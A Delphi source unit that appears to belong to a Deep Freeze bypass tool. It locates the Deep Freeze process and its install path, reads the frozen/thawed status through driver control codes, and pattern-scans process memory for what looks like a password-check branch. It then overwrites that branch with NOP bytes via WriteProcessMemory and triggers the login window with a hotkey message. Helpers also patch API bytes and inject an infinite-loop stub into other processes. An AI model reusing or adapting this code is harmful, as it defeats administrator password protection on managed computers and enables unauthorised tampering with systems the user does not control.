unit ADF_Functions;

interface

uses
  Windows,Registry,SysUtils,TlHelp32,TitanEngine,Classes;

const
  StartAddr = $00400000;
  EndAddr   = $00500000;

  // Deep Freeze Status Flags
  DF_STATUS_THAWED  = $00;
  DF_STATUS_FROZEN  = $01;
  DF_STATUS_UNKNOWN = $02;

  // file info flags
  FILE_INFO_COMPANYNAME       = $01;
  FILE_INFO_FILEDESCRIPTION   = $02;
  FILE_INFO_FILEVERSION       = $03;
  FILE_INFO_INTERNALNAME      = $04;
  FILE_INFO_LEGALCOPYRIGHT    = $05;
  FILE_INFO_LEGALTRADEMARKS   = $06;
  FILE_INFO_ORIGINALFILENAME  = $07;
  FILE_INFO_PRODUCTNAME       = $08;
  FILE_INFO_PRODUCTVERSION    = $09;
  FILE_INFO_COMMENTS          = $0A;
  FILE_INFO_AUTHOR            = $0B;

//********************************************
function GetRegistryData(RootKey: HKEY; Key, Value: string): variant;
function GetProcessPath(ExeProcessID: DWORD):String;
function GetProcessIdFromWindow(hWin:HWND):Cardinal;
function GetFileVersion(Filename:String; InfoType:DWORD):String;
function GetAPIAddress(DllName,ApiName:String):Pointer;
function BypassAPI(hProc:Cardinal; DllName,ApiName:String; PatchBytes:Pointer; PatchSize:Cardinal):boolean;
function MakeInfiniteLoop(hProc:Cardinal; OEPAddr:Pointer; OriginalBytes:Pointer ):boolean;
function GetFileOEP(ExeFilePath:PChar):DWORD;
function GetWinVersion: String;
function GetSystemDrive: string;
function GetWinDir: string;
procedure SaveTextToFile(const FileName: string; Text:String );
//********************************************
function GetDFreezWindow:HWND;
function GetDFreezProcFromWind:Cardinal;
function GetDirFromWind:String;
function GetDirFromReg:String;
function GetDFStatus:DWORD;
function DFStatusToStr(Status:DWORD):String;
function GetDFVersion:String;
function FindMagicBytes(hProc:Cardinal):Cardinal;
function IsMemoryPatched(hProc:Cardinal):Boolean;
function PatchMemory(hProc,Addr:Cardinal):Boolean;
procedure ShowDFLoginWindow(Thread_id:DWORD);
//********************************************


implementation

function GetRegistryData(RootKey: HKEY; Key, Value: string): variant;
var
  Reg: TRegistry;
  RegDataType: TRegDataType;
  DataSize, Len: integer;
  s: string;
label cantread;
begin
  Reg := nil;
  try
    Reg := TRegistry.Create(KEY_QUERY_VALUE);
    Reg.RootKey := RootKey;
    if reg.KeyExists(key) then
    if Reg.OpenKeyReadOnly(Key) then begin
    if reg.ValueExists(value)  then
      try
        RegDataType := Reg.GetDataType(Value);
        if (RegDataType = rdString) or
           (RegDataType = rdExpandString) then
          Result := Reg.ReadString(Value)
        else if RegDataType = rdInteger then
          Result := Reg.ReadInteger(Value)
        else if RegDataType = rdBinary then begin
          DataSize := Reg.GetDataSize(Value);
          if DataSize = -1 then goto cantread;
          SetLength(s, DataSize);
          Len := Reg.ReadBinaryData(Value, PChar(s)^, DataSize);
          if Len <> DataSize then goto cantread;
          Result := s;
        end else
cantread:
          raise Exception.Create(SysErrorMessage(ERROR_CANTREAD));
      except
        s := ''; // Deallocates memory if allocated
        Reg.CloseKey;
        raise;
      end;
      Reg.CloseKey;
    end else
      raise Exception.Create(SysErrorMessage(GetLastError));
  except
    Reg.Free;
    raise;
  end;
  Reg.Free;
end;

function GetProcessPath(ExeProcessID: DWORD):String;
var
  FSnapshotHandle: THandle;
  FModuleEntry32:TModuleEntry32;
begin
  try
    FSnapshotHandle := CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, ExeProcessID);
    FModuleEntry32.dwSize:=SizeOf(FModuleEntry32);
    Module32First(FSnapshotHandle, FModuleEntry32);
    Result:=FModuleEntry32.szExePath;
  except
    Result:='';
  end;
end;

function GetProcessIdFromWindow(hWin:HWND):Cardinal;
var Pid:Cardinal;
begin
if IsWindow(hWin) then
  try
	GetWindowThreadProcessId(hWin,Pid);
	Result:=Pid;
  except
	Result:=0;
  end
else
  Result:=0;
end;

function GetAPIAddress(DllName,ApiName:String):Pointer;
var hDll:HMODULE;
begin
hDll:=GetModuleHandle(PChar(DllName));
If hDll = 0 Then
  Begin
    try
      hDll:=LoadLibrary(Pchar(DllName));
      Result:= GetProcAddress (hDll,Pchar(ApiName));
    finally
      FreeLibrary(hDll);
    end;
  end
else
  Result:= GetProcAddress (hDll,Pchar(ApiName));
end;

function GetFileVersion(Filename:String; InfoType:DWORD):String;
const InfoNum = 11;
var
  InfoSize:DWORD;
  InfoStr:String;
  Buffer:Pointer;
  Info : PChar;
begin
  Result := '';
  if FileExists(Filename) then
  begin
    InfoSize:=GetFileVersionInfoSize(PChar(Filename),InfoSize);
    if InfoSize <> 0 then
    begin
      Buffer := AllocMem(InfoSize);
      if GetFileVersionInfo(PChar(Filename),0,InfoSize,Buffer) then
      begin
        Case InfoType of
          FILE_INFO_COMPANYNAME     : InfoStr := 'CompanyName';
          FILE_INFO_FILEDESCRIPTION : InfoStr := 'FileDescription';
          FILE_INFO_FILEVERSION     : InfoStr := 'FileVersion';
          FILE_INFO_INTERNALNAME    : InfoStr := 'InternalName';
          FILE_INFO_LEGALCOPYRIGHT  : InfoStr := 'LegalCopyright';
          FILE_INFO_LEGALTRADEMARKS : InfoStr := 'LegalTradeMarks';
          FILE_INFO_ORIGINALFILENAME: InfoStr := 'OriginalFilename';
          FILE_INFO_PRODUCTNAME     : InfoStr := 'ProductName';
          FILE_INFO_PRODUCTVERSION  : InfoStr := 'ProductVersion';
          FILE_INFO_COMMENTS        : InfoStr := 'Comments';
          FILE_INFO_AUTHOR          : InfoStr := 'Author';
        else
          exit;
        end;
          if VerQueryValue(Buffer,PChar('StringFileInfo\040904E4\'+InfoStr),Pointer(Info),InfoSize) then
            result := Info;
      end;
    end;
  end;
end;

function GetFileOEP(ExeFilePath:PChar):DWORD;
var
  ImageBase,EntryPoint:DWORD;
begin
Result := 0;
ImageBase := 0;
EntryPoint := 0;
if FileExists(ExeFilePath) then
  begin
    ImageBase:=GetPE32Data(pchar(ExeFilePath),0,UE_IMAGEBASE);
    EntryPoint:=GetPE32Data(pchar(ExeFilePath),0,UE_OEP);
    Result:= ImageBase + EntryPoint;
  end;
end;

function BypassAPI(hProc:Cardinal; DllName,ApiName:String; PatchBytes:Pointer; PatchSize:Cardinal):boolean;
var
  APIAddress:Pointer;
  NumberOfBytes:Cardinal;
begin
Result:=False;
APIAddress:=GetAPIAddress(DllName,ApiName);
if APIAddress <> nil then
  if WriteProcessMemory(hProc,APIAddress,PatchBytes,PatchSize,NumberOfBytes) then
    Result:=True
end;

function MakeInfiniteLoop(hProc:Cardinal; OEPAddr:Pointer; OriginalBytes:Pointer ):boolean;
var
  InfiniteLoop:array [0..1]of byte;
  NumberOfBytes:Cardinal;
begin
  Result:=False;
  InfiniteLoop[0]:=$EB;
  InfiniteLoop[1]:=$FE;
  if ReadProcessMemory(hProc,OEPAddr,OriginalBytes,2,NumberOfBytes) then
    if WriteProcessMemory(hProc,OEPAddr,@InfiniteLoop,SizeOf(InfiniteLoop),NumberOfBytes) then
      Result:=True;
end;

procedure SaveTextToFile(const FileName: string; Text:String );
var
  Stream: TStream;
begin
  Stream := TFileStream.Create(FileName, fmCreate);
  try
    Stream.WriteBuffer(Pointer(Text)^, Length(Text));
  finally
    Stream.Free;
  end;
end;

function GetWinVersion: String;
var
   osVerInfo: TOSVersionInfo;
   majorVersion, minorVersion: Integer;
begin
   Result := 'Unknown';
   osVerInfo.dwOSVersionInfoSize := SizeOf(TOSVersionInfo) ;
   if GetVersionEx(osVerInfo) then
   begin
     minorVersion := osVerInfo.dwMinorVersion;
     majorVersion := osVerInfo.dwMajorVersion;
     case osVerInfo.dwPlatformId of
       VER_PLATFORM_WIN32_NT:
       begin
         if majorVersion <= 4 then
           Result := 'WinNT'
         else if (majorVersion = 5) and (minorVersion = 0) then
           Result := 'Win2000'
         else if (majorVersion = 5) and (minorVersion = 1) then
           Result := 'WinXP'
         else if (majorVersion = 6) then
           Result := 'WinVista';
       end;
       VER_PLATFORM_WIN32_WINDOWS:
       begin
         if (majorVersion = 4) and (minorVersion = 0) then
           Result := 'Win95'
         else if (majorVersion = 4) and (minorVersion = 10) then
         begin
           if osVerInfo.szCSDVersion[1] = 'A' then
             Result := 'Win98SE'
           else
             Result := 'Win98';
         end
         else if (majorVersion = 4) and (minorVersion = 90) then
           Result := 'WinME'
         else
           Result := 'Unknown';
       end;
     end;
   end;
end;

function GetSystemDrive: string;
begin
  SetLength(Result, MAX_PATH);
  if GetWindowsDirectory(PChar(Result), MAX_PATH) > 0 then
  begin
    SetLength(Result, StrLen(PChar(Result)));
    Result := ExtractFileDrive(Result);
  end;
end;

function GetWinDir: string;
var
  dir: array [0..MAX_PATH] of Char;
begin
  GetWindowsDirectory(dir, MAX_PATH);
  Result := StrPas(dir);
end;
//********************************************
function GetDFreezWindow:HWND;
var  hWin:HWND;
begin
Result:=0;
hWin:=FindWindow('TApplication','FrzState2k');
if hWin <> 0 then
  begin
  Result:=hWin;
  Exit;
  end;
hWin:=FindWindow('TApplication','Frzstate');
if  hWin <> 0 then
  Result:=hWin;
end;

function GetDFreezProcFromWind:Cardinal;
var hWind:Hwnd;
begin
hWind:=GetDFreezWindow;
if IsWindow(hWind) then
  Result:=GetProcessIdFromWindow(hWind)
else
  Result:=0;
end;

function GetDirFromWind:String;
var Pid:Cardinal;
begin
Pid:=GetDFreezProcFromWind;
  if Pid <> 0 then
    Result:=GetProcessPath(Pid)
  else
    Result:='';
end;

function GetDirFromReg:String;
var  Directory:string;
begin
Directory:=GetRegistryData(HKEY_LOCAL_MACHINE,'\SYSTEM\ControlSet001\Services\DeepFrz\Parameters','InstallPath');
if Directory <>'' then
  Result:=Directory+'_$Df\FrzState2k.exe'
else
  begin
    Directory:=GetRegistryData(HKEY_LOCAL_MACHINE,'\SYSTEM\ControlSet001\Services\DepFrzLo\Parameters','InstallPath');
    if Directory <>'' then
      Result:=Directory+'_$Df\Frzstate.exe';
  end;
end;

function GetDFVersion:String;
var Version,Dir:String;
begin
  Result := 'unKnown';
  Version := GetRegistryData(HKEY_LOCAL_MACHINE,'\SOFTWARE\Faronics\Deep Freeze 6','DF Version');
  if Version <> '' then
    Result := Version
  else
  begin
    Dir := GetDirFromReg;
    if not FileExists(Dir) then
    begin
      Dir := GetDirFromWind;
      if not FileExists(Dir) then
      begin
        Dir := GetWinDir+'\system32\drivers\DeepFrz.sys';
        if not FileExists(Dir) then
        begin
          Dir := GetWinDir+'\system32\drivers\DepFrzLo.sys';
          if not FileExists(Dir) then
            exit;
        end;
      end;
    end;
    Version := GetFileVersion(Dir,FILE_INFO_PRODUCTVERSION);
    if Version <> '' then
      Result := Version;
  end;
end;

function GetDFStatus:DWORD;
var
  DeviceName:String;
	hDevice:HWND;
	Buffer,lpBytesReturned:DWORD;
begin
  Result := DF_STATUS_UNKNOWN;
	DeviceName := GetSystemDrive;
	hDevice:=CreateFileA(PChar('\\.\'+DeviceName),0,0,nil,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);
	if hDevice <> INVALID_HANDLE_VALUE then
  begin
    if DeviceIoControl(hDevice,$7200C,nil,0,@Buffer,sizeof(Buffer),lpBytesReturned,nil) or   // v4 , v5
       DeviceIoControl(hDevice,$7202C,nil,0,@Buffer,sizeof(Buffer),lpBytesReturned,nil) or   // v6 , v7
       DeviceIoControl(hDevice,$7205C,nil,0,@Buffer,sizeof(Buffer),lpBytesReturned,nil) or  // v6.3 Evaluation
       DeviceIoControl(hDevice,$71C08,nil,0,@Buffer,sizeof(Buffer),lpBytesReturned,nil) then // v6 , v7 all (used in unistall)
          if Buffer = DF_STATUS_THAWED then
            Result := DF_STATUS_THAWED  //Thawed
          else
            Result := DF_STATUS_FROZEN; //Freeze
     CloseHandle(hDevice);
  end;
end;

function DFStatusToStr(Status:DWORD):String;
begin
  Case Status of
    DF_STATUS_THAWED : Result := 'Thawed';
    DF_STATUS_FROZEN : Result := 'Frozen';
  else
    Result := 'unKnown';
  end;
end;

function FindMagicBytes(hProc:Cardinal):Cardinal;
var
  dtPattern : array[0..64] of BYTE;

  dtPatternSize : LongInt;
  glWildCard : BYTE;
begin
  dtPattern[0]  := $83;
  dtPattern[1]  := $C4;
  dtPattern[2]  := $08;
  dtPattern[3]  := $50;
  dtPattern[4]  := $E8;
  dtPattern[5]  := $77;
  dtPattern[6]  := $77;
  dtPattern[7]  := $77;
  dtPattern[8]  := $77;
  dtPattern[9]  := $83;
  dtPattern[10] := $C4;
  dtPattern[11] := $10;
  dtPattern[12] := $84;
  dtPattern[13] := $C0;
  dtPattern[14] := $0F;
  dtPatternSize :=  15;

  glWildCard    := $77;

  try
    Result:=FindEx(hProc,StartAddr,EndAddr-StartAddr,@dtPattern,dtPatternSize,@glWildCard);
  Except
    Result:=0;
  end;
end;

function IsMemoryPatched(hProc:Cardinal):Boolean;
var
  dtPattern : array[0..64] of BYTE;

  dtPatternSize : LongInt;
  glWildCard : BYTE;
begin
  dtPattern[0]  := $83;
  dtPattern[1]  := $C4;
  dtPattern[2]  := $08;
  dtPattern[3]  := $50;
  dtPattern[4]  := $E8;
  dtPattern[5]  := $77;
  dtPattern[6]  := $77;
  dtPattern[7]  := $77;
  dtPattern[8]  := $77;
  dtPattern[9]  := $83;
  dtPattern[10] := $C4;
  dtPattern[11] := $10;
  dtPattern[12] := $84;
  dtPattern[13] := $C0;
  dtPattern[14] := $90;
  dtPattern[15] := $90;
  dtPattern[16] := $90;
  dtPattern[17] := $90;
  dtPattern[18] := $90;
  dtPattern[19] := $90;
  dtPatternSize :=  20;

  glWildCard    := $77;
  
  try
    if FindEx(hProc,StartAddr,EndAddr-StartAddr,@dtPattern,dtPatternSize,@glWildCard) <> 0 then
      Result:=True
    else
      Result:=False;
  Except
    Result:=False;
  end;
end;

function PatchMemory(hProc,Addr:Cardinal):Boolean;
var
  NumberOfBytes:Cardinal;
  PatchBytes : array[0..6] of BYTE;
  PatchBytesSize:Longint;
begin
PatchBytes[0] := $90;
PatchBytes[1] := $90;
PatchBytes[2] := $90;
PatchBytes[3] := $90;
PatchBytes[4] := $90;
PatchBytes[5] := $90;
PatchBytesSize  := 6;
if WriteProcessMemory(hProc,ptr(Addr+$E),@PatchBytes,PatchBytesSize,NumberOfBytes) then
  Result:=True
else
  Result:=False;
end;

procedure ShowDFLoginWindow(Thread_id:DWORD);
const WM_HOTKEY = $312;
  function MyEnumThreadWndProc(hWindow: HWND; aParam:byte): Boolean; stdcall;
  begin
    SendMessage(GetWindow(hWindow, GW_CHILD),WM_HOTKEY,$3FF6,0);
    SendMessage(hWindow,WM_HOTKEY,$3FF6,0);
   result := True;
  end;
begin
  EnumThreadWindows(Thread_id,@MyEnumThreadWndProc,0);
end;
//********************************************



end.
